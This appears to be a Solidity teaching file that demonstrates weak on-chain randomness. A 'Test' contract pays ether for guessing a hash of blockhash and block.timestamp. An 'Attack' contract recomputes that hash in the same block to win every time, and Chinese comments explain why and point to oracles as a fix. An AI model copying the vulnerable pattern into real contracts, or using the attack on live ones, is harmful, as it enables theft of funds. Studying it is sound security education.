```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract Test {
    constructor() payable {}

    function guess(uint _given) external {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (answer == _given) {
            payable(msg.sender).transfer(1 ether);
        }
    }

    function getAnswerTest() external view returns (uint) {
        return uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );
    }
}

contract Attack {
    Test test;

    constructor(address _addr) {
        test = Test(_addr);
    }

    receive() external payable {}
    //区块链中不存在随机数，因为区块链数据都是确定的，需要被所有节点验证
    //任何代码生成的随机数，都可以被相同的代码计算出相同的结果，即使是时间戳，也可以定时调用以符合结果

		//多方验证模型可以一定程度随机化结果，或者使用预言机
    function attack() external {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        test.guess(answer);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```